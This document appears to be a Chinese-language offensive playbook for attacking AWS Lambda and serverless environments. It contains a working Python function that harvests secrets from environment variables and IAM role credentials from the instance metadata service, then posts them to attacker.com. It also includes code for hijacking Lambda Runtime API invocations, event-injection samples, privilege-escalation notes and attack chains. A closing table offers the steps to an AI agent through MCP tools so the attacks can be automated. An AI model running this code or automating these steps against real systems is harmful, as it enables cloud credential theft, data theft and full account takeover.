# Serverless / Lambda 攻击

## Lambda Runtime API (端口 9001)

Lambda 执行环境内的 Runtime API 是攻击者的宝藏。任何 RCE 或 SSRF 都能打到 `http://127.0.0.1:9001/2018-06-01/runtime/`。

```python
# 从 Lambda 内提取 IAM 凭证
import requests, os, json

def steal_creds():
    """Lambda Runtime API → IAM credential chain"""
    # Step 1: 读环境变量
    env_vars = dict(os.environ)
    for k in ["AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
              "AWS_SESSION_TOKEN", "_HANDLER", "AWS_LAMBDA_RUNTIME_API"]:
        if k in env_vars: print(f"  {k}={env_vars[k][:20]}...")

    # Step 2: 有 IMDSv2? 先拿 token
    try:
        token = requests.put(
            "http://169.254.169.254/latest/api/token",
            headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
            timeout=2
        ).text
        headers = {"X-aws-ec2-metadata-token": token}
    except:
        headers = {}  # IMDSv1 fallback

    # Step 3: 拿 IAM role 凭证
    role = requests.get(
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        headers=headers, timeout=2
    ).text
    creds = requests.get(
        f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}",
        headers=headers, timeout=2
    ).json()

    # Step 4: 外带到攻击者服务器
    requests.post("https://attacker.com/collect", json={
        "role": role, "creds": creds, "env": {k: v for k, v in env_vars.items()
            if "SECRET" in k or "KEY" in k or "TOKEN" in k or "PASS" in k}
    })
    return creds

# 有了 creds → 本地配 AWS CLI → 全账户接管
# aws sts get-caller-identity
# aws s3 ls
```

## Runtime API 劫持

```python
# 劫持后续 Lambda 调用
# Lambda 通过 GET /runtime/invocation/next 获取事件
# 攻击者可以先终止当前调用，然后轮询下一个事件 → 窃取数据

def hijack_next_invocation():
    """Hook Lambda runtime 获取下一个请求的事件数据"""
    NEXT_URL = "http://127.0.0.1:9001/2018-06-01/runtime/invocation/next"
    # Cookie / API key 可能在事件 payload 中
    r = requests.get(NEXT_URL, timeout=30)
    # r.headers["lambda-runtime-aws-request-id"] → request ID
    # r.text → 完整事件 JSON (可能含用户输入、token、PII)
    return r.json()
```

## Event Injection (触发源投毒)

```python
# S3 触发器: bucket 名可控 → 其他 bucket 事件注入
# SQS 触发器: 队列名可控 → 跨账户消息注入
# API Gateway: path parameters 注入 → 内部路由绕过

# 示例: S3 Put 事件注入
s3_event = {
    "Records": [{
        "s3": {
            "bucket": {"name": "attacker-controlled-bucket"},
            "object": {"key": "malicious_file.json"}
        }
    }]
}
# 如果 Lambda 信任事件中的 bucket name 去读文件 → SSRF/文件读取
```

## IAM 权限枚举 & 提权

```python
# 从 Lambda 角色枚举所有可用 IAM action
def enumerate_iam(creds):
    import boto3
    client = boto3.client('iam',
        aws_access_key_id=creds['AccessKeyId'],
        aws_secret_access_key=creds['SecretAccessKey'],
        aws_session_token=creds['Token']
    )
    # 检查所有 Lambda 操作权限
    actions = [
        "lambda:UpdateFunctionCode", "lambda:CreateFunction",
        "iam:PassRole", "iam:CreateAccessKey", "iam:AttachUserPolicy",
        "s3:ListBuckets", "s3:GetObject",
        "dynamodb:Scan", "dynamodb:GetItem",
        "ssm:GetParameter", "sts:AssumeRole",
    ]
    for action in actions:
        try:
            # 用 simulate-principal-policy 或直接 try
            pass  # 实际通过 dry-run 或报错判断
        except: pass
```

## 冷启动竞态

```python
# Lambda 冷启动时 /tmp 是共享的
# 如果两次调用使用同一个 execution environment:
# Call 1: 写入 /tmp/payload.json
# Call 2: 相同的 env → 读到 Call 1 的数据

# 利用: 先写入大型恶意 payload，等待下一个请求使用
```

## 攻击链

```
SSRF → metadata → IAM credential → AWS CLI → 数据/全账户
RCE → Lambda Runtime API → 劫持后续调用 → 窃取事件数据
Event Injection → 触发器参数污染 → Lambda 读取攻击者资源
Lambda → ssm:GetParameter → 读所有环境变量 → DB 密码
Lambda → sts:AssumeRole → 跨账户提权 → 组织级访问
```

## Evidence

记录: 提取的 IAM credential (脱敏)、env 变量列表、Runtime API 响应、IAM permission 枚举结果

## MCP 工具映射

AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：

| 攻击步骤 | MCP 工具 | 说明 |
|---------|---------|------|
| Serverless 端点探测 | `http_probe` | HTTP GET 探测 serverless Lambda 端点 |
| 知识检索 | `kb_router` | 按 serverless 攻击信号搜索知识库 |
